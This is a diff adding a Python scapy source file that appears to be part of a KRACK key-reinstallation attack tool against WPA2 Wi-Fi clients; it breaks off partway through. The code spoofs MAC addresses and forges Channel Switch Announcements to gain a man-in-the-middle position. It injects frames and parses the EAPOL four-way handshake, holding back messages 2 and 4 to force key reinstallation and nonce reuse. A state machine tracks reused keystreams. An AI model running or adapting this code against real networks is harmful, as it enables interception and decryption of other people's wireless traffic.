@@ -1,0 +1,297 @@
+from scapy.all import * 
+from datetime import datetime
+import sys, os, socket, struct, time, argparse, heapq, subprocess, atexit, select, textwrap
+
+
+IEEE_TLV_TYPE_SSID    = 0
+IEEE_TLV_TYPE_CHANNEL = 3
+IEEE_TLV_TYPE_RSN     = 48
+IEEE_TLV_TYPE_CSA     = 37
+IEEE_TLV_TYPE_VENDOR  = 221
+
+IEEE80211_RADIOTAP_RATE = (1 << 2)
+IEEE80211_RADIOTAP_CHANNEL = (1 << 3)
+IEEE80211_RADIOTAP_TX_FLAGS = (1 << 15)
+IEEE80211_RADIOTAP_DATA_RETRIES = (1 << 17)
+
+#### Basic output and logging functionality ####
+ALL, DEBUG, INFO, STATUS, WARNING, ERROR = range(6)
+COLORCODES = { "gray"  : "\033[0;37m",
+               "green" : "\033[0;32m",
+               "orange": "\033[0;33m",
+               "red"   : "\033[0;31m" }
+
+global_log_level = INFO
+def log(level, msg, color=None, showtime=True):
+	if level < global_log_level: return
+	if level == DEBUG   and color is None: color="gray"
+	if level == WARNING and color is None: color="orange"
+	if level == ERROR   and color is None: color="red"
+	print((datetime.now().strftime('[%H:%M:%S] ') if showtime else " "*11) + COLORCODES.get(color, "") + msg + "\033[1;0m")
+
+#### Utility ####
+def call_macchanger(iface, macaddr):
+	try:
+		subprocess.check_output(["macchanger", "-m", macaddr, iface])
+	except subprocess.CalledProcessError as err:
+		if not "It's the same MAC!!" in err.output.decode():
+			print(err.output.decode())
+			raise
+
+def set_mac_address(iface, macaddr):
+	subprocess.check_output(["ifconfig", iface, "down"])
+	call_macchanger(iface, macaddr)
+	subprocess.check_output(["ifconfig", iface, "up"])
+
+#### Packet Processing Functions ####
+def xorstr(lhs, rhs):
+	return "".join([chr(ord(lb) ^ ord(rb)) for lb, rb in zip(lhs, rhs)])
+
+def dot11_get_seqnum(p):
+	# .... .... .... (....)對齊用
+	return p[Dot11].SC >> 4
+
+def dot11_get_iv(p):
+	if not p.haslayer(Dot11WEP):
+		log(ERROR, "INTERNAL ERROR: Requested IV of plaintext frame")
+		return 0
+	wep = p[Dot11WEP]
+	if wep.keyid & 32:
+		return ord(wep.iv[0]) + (ord(wep.iv[1]) << 8) + (struct.unpack(">I", wep.wepdata[:4])[0] << 16)
+	else:
+		return int.from_bytes(wep.iv, 'little')
+
+def dot11_get_tid(p):
+	if p.haslayer(Dot11QoS):
+		return ord(bytes(p[Dot11QoS])[0]) & 0x0F
+	return 0
+
+def dot11_is_group(p):
+	return p.addr1 == "ff:ff:ff:ff:ff:ff"
+
+def get_eapol_msgnum(p):
+	# key information 對應位置
+	FLAG_PAIRWISE = 0b0000001000
+	FLAG_ACK      = 0b0010000000
+	FLAG_SECURE   = 0b1000000000
+
+	if not p.haslayer(EAPOL): return 0
+	keyinfo = bytes(p[EAPOL])[5:7]
+	flags = struct.unpack(">H", keyinfo)[0]
+	# pairwise 都是 1
+	if flags & FLAG_PAIRWISE:
+		# ACK 為 1，sent by server
+		if flags & FLAG_ACK:
+			# 如果有加密，則為 msg3
+			if flags & FLAG_SECURE: return 3
+			else: return 1
+		# ACK 為 0，sent by client
+		else:
+			keydatalen = struct.unpack(">H", bytes(p[EAPOL].load[93:95]))[0]
+			# msg4 不會有任何 data
+			if keydatalen == 0: return 4
+			else: return 2
+	return 0
+
+def get_eapol_replaynum(p):
+	return struct.unpack(">Q", p[EAPOL].load[5:13])[0]
+
+def set_eapol_replaynum(p, value):
+	p[EAPOL].load = p[EAPOL].load[:5] + struct.pack(">Q", value) + p[EAPOL].load[13:]
+	return p
+
+def dot11_to_str(p):
+	EAP_CODE = {1: "Request"}
+	EAP_TYPE = {1: "Identity"}
+	DEAUTH_REASON = {1: "Unspecified", 2: "Prev_Auth_No_Longer_Valid/Timeout", 3: "STA_is_leaving", 4: "Inactivity", 6: "Unexp_Class2_Frame",
+		7: "Unexp_Class3_Frame", 8: "Leaving", 15: "4-way_HS_timeout"}
+	dict_or_str = lambda d, v: d.get(v, str(v))
+	if p.type == 0:
+		if p.haslayer(Dot11Beacon):     return "Beacon(seq=%d, TSF=%d)" % (dot11_get_seqnum(p), p[Dot11Beacon].timestamp)
+		if p.haslayer(Dot11ProbeReq):   return "ProbeReq(seq=%d)" % dot11_get_seqnum(p)
+		if p.haslayer(Dot11ProbeResp):  return "ProbeResp(seq=%d)" % dot11_get_seqnum(p)
+		if p.haslayer(Dot11Auth):       return "Auth(seq=%d, status=%d)" % (dot11_get_seqnum(p), p[Dot11Auth].status)
+		if p.haslayer(Dot11Deauth):     return "Deauth(seq=%d, reason=%s)" % (dot11_get_seqnum(p), dict_or_str(DEAUTH_REASON, p[Dot11Deauth].reason))
+		if p.haslayer(Dot11AssoReq):    return "AssoReq(seq=%d)" % dot11_get_seqnum(p)
+		if p.haslayer(Dot11ReassoReq):  return "ReassoReq(seq=%d)" % dot11_get_seqnum(p)
+		if p.haslayer(Dot11AssoResp):   return "AssoResp(seq=%d, status=%d)" % (dot11_get_seqnum(p), p[Dot11AssoResp].status)
+		if p.haslayer(Dot11ReassoResp): return "ReassoResp(seq=%d, status=%d)" % (dot11_get_seqnum(p), p[Dot11ReassoResp].status)
+		if p.haslayer(Dot11Disas):      return "Disas(seq=%d)" % dot11_get_seqnum(p)
+		if p.subtype == 13:      return "Action(seq=%d)" % dot11_get_seqnum(p)
+	elif p.type == 1:
+		if p.subtype ==  9:      return "BlockAck"
+		if p.subtype == 11:      return "RTS"
+		if p.subtype == 13:      return "Ack"
+	elif p.type == 2:
+		if p.haslayer(Dot11WEP): return "EncryptedData(seq=%d, IV=%d)" % (dot11_get_seqnum(p), dot11_get_iv(p))
+		if p.subtype == 4:       return "Null(seq=%d, sleep=%d)" % (dot11_get_seqnum(p), p.FCfield & 0x10 != 0)
+		if p.subtype == 12:      return "QoS-Null(seq=%d, sleep=%d)" % (dot11_get_seqnum(p), p.FCfield & 0x10 != 0)
+		if p.haslayer(EAPOL):
+			if get_eapol_msgnum(p) != 0: return "EAPOL-Msg%d(seq=%d,replay=%d)" % (get_eapol_msgnum(p), dot11_get_seqnum(p), get_eapol_replaynum(p))
+			elif p.haslayer(EAP):return "EAP-%s,%s(seq=%d)" % (dict_or_str(EAP_CODE, p[EAP].code), dict_or_str(EAP_TYPE, p[EAP].type), dot11_get_seqnum(p))
+			else:                return repr(p)
+		if p.haslayer(Dot11CCMP): return "EncryptedData(seq=%d)" % dot11_get_seqnum(p)
+	return repr(p)			
+
+def construct_csa(channel, count=1):
+	switch_mode = 1			# STA should not Tx untill switch is completed
+	new_chan_num = channel	# Channel it should switch to
+	switch_count = count	# Immediately make the station switch
+	# Contruct the IE
+	payload = struct.pack("<BBB", switch_mode, new_chan_num, switch_count)
+	return Dot11Elt(ID=IEEE_TLV_TYPE_CSA, info=payload)
+
+def append_csa(p, channel, count=1):
+	p = p.copy()
+	el = p[Dot11Elt]
+	prevel = None
+	while isinstance(el, Dot11Elt):
+		prevel = el
+		el = el.payload
+	prevel.payload = construct_csa(channel, count)
+	return p
+
+#### Man-in-the-middle Code ####
+class MitmSocket(L2Socket):
+	def __init__(self, dumpfile=None, strict_echo_test=False, **kwargs):
+		super(MitmSocket, self).__init__(**kwargs)
+		self.pcap = None
+		if dumpfile:
+			self.pcap = PcapWriter("%s.%s.pcap" % (dumpfile, self.iface), append=False, sync=True)
+		self.strict_echo_test = strict_echo_test
+
+	def set_channel(self, channel):
+		subprocess.check_output(["iw", self.iface, "set", "channel", str(channel)])
+
+	def send(self, p):
+		# 所有送出去的封包都要加 radiotap
+		p[Dot11].FCfield |= 0x20
+		L2Socket.send(self, RadioTap()/p)
+		if self.pcap: self.pcap.write(RadioTap()/p)
+		log(DEBUG, "%s: Injected frame %s" % (self.iface, dot11_to_str(p)))
+
+	def _strip_fcs(self, p):
+		# radiotap header flags 0x00...0: no used FCS failed
+		# .present is flagsfield
+		if p[RadioTap].present & 2 != 0 and not p.haslayer(Dot11FCS):
+			rawframe = raw(p[RadioTap])
+			pos = 8 # FCS 在 frame 開頭後第 9 bytes 的地方
+			while orb(rawframe[pos - 1]) & 0x80 != 0: pos += 4
+			# If the TSFT field is present, it must be 8-bytes aligned
+			if p[RadioTap].present & 1 != 0:
+				pos += (8 - (pos % 8))
+				pos += 8
+			# radiotap flag & 0x10
+			if rawframe[pos] & 0x10 != 0:
+				try:
+					# FCS 在 frame 的最後 4 bytes
+					return Dot11(raw(p[Dot11FCS])[:-4])
+				except:
+					return None
+				
+		return p[Dot11]
+
+	def recv(self, x=MTU):
+		p = L2Socket.recv(self, x)
+		if p == None: 
+			return None, None
+		if p.getlayer(Dot11) == None:
+			return None, None
+		
+		if self.pcap: self.pcap.write(p)
+		# Don't care about control frames
+		if p.type == 1:
+			log(ALL, "%s: ignoring control frame %s" % (self.iface, dot11_to_str(p)))
+			return None, None
+
+		# 1. Radiotap monitor mode header is defined in ieee80211_add_tx_radiotap_header: TX_FLAGS, DATA_RETRIES, [RATE, MCS, VHT, ]
+		# 2. Radiotap header for normal received frames is defined in ieee80211_add_rx_radiotap_header: FLAGS, CHANNEL, RX_FLAGS, [...]
+		# 3. Beacons generated by hostapd and recieved on virtual interface: TX_FLAGS, DATA_RETRIES
+		#
+		# Conclusion: if channel flag is not present, but rate flag is included, then this could be an echoed injected frame.
+		# Warning: this check fails to detect injected frames captured by the other interface (due to proximity of transmittors and capture effect)
+		radiotap_possible_injection = (p[RadioTap].present & IEEE80211_RADIOTAP_CHANNEL == 0) and not (p[RadioTap].present & IEEE80211_RADIOTAP_RATE == 0)
+
+		# Hack: ignore frames that we just injected and are echoed back by the kernel. Note that the More Data flag also
+		#	allows us to detect cross-channel frames (received due to proximity of transmissors on different channel)
+		if p[Dot11].FCfield & 0x20 != 0 and (not self.strict_echo_test or radiotap_possible_injection):
+			log(DEBUG, "%s: ignoring echoed frame %s (0x%02d, present=%08d, strict=%d)" % (self.iface, dot11_to_str(p), p[Dot11].FCfield, p[RadioTap].present, radiotap_possible_injection))
+			return None, None
+		else:
+			log(ALL, "%s: Received frame: %s" % (self.iface, dot11_to_str(p)))
+		result = self._strip_fcs(p)
+		return result, p
+
+	def close(self):
+		if self.pcap: self.pcap.close()
+		super(MitmSocket, self).close()
+
+
+class ClientState():
+	Initializing, Connecting, GotMitm, Attack_Started, Success_Reinstalled, Success_AllzeroKey, Failed = range(7)
+
+	def __init__(self, macaddr):
+		self.macaddr = macaddr
+		self.reset()
+
+	def reset(self):
+		self.state = ClientState.Initializing
+		self.keystreams = dict()
+		self.attack_max_iv = None
+		self.attack_time = None
+
+		self.assocreq = None
+		self.msg1 = None
+		self.msg3s = []
+		self.msg4 = None
+		self.krack_finished = False
+
+	def store_msg1(self, msg1):
+		self.msg1 = msg1
+
+	def add_if_new_msg3(self, msg3):
+		if get_eapol_replaynum(msg3) in [get_eapol_replaynum(p) for p in self.msg3s]:
+			return
+		self.msg3s.append(msg3)
+
+	def update_state(self, state):
+		log(DEBUG, "Client %s moved to state %d" % (self.macaddr, state), showtime=False)
+		self.state = state
+
+	def mark_got_mitm(self):
+		if self.state <= ClientState.Connecting:
+			self.state = ClientState.GotMitm
+			log(STATUS, "Established MitM position against client %s (moved to state %d)" % (self.macaddr, self.state),
+				color="green", showtime=False)
+
+	def is_state(self, state):
+		return self.state == state
+
+	def should_forward(self, p, group):
+		if group:
+			# Forwarding rules when attacking the group handshake
+			return True
+		else:
+			# Forwarding rules when attacking the 4-way handshake
+			if self.state in [ClientState.Connecting, ClientState.GotMitm, ClientState.Attack_Started]:
+				# Also forward Action frames (e.g. Broadcom AP waits for ADDBA Request/Response before starting 4-way HS).
+				# 四次交握不轉送 msg2 & msg4
+				return p.haslayer(Dot11Auth) or p.haslayer(Dot11AssoReq) or p.haslayer(Dot11AssoResp) or (1 <= get_eapol_msgnum(p) and get_eapol_msgnum(p) <= 3) or (p.type == 0 and p.subtype == 13)
+			return self.state in [ClientState.Success_Reinstalled]
+
+	def save_iv_keystream(self, iv, keystream):
+		self.keystreams[iv] = keystream
+
+	def get_keystream(self, iv):
+		return self.keystreams[iv]
+
+	def attack_start(self):
+		self.attack_max_iv = 0 if len(self.keystreams.keys()) == 0 else max(self.keystreams.keys())
+		self.attack_time = time.time()
+		self.update_state(ClientState.Attack_Started)
+
+	def is_iv_reused(self, iv):
+		return self.is_state(ClientState.Attack_Started) and iv in self.keystreams
+
+	def attack_timeout(self, iv):
+		return self.is_state(ClientState.Attack_Started) and self.attack_time + 1.5 < time.time() and self.attack_max_iv < iv
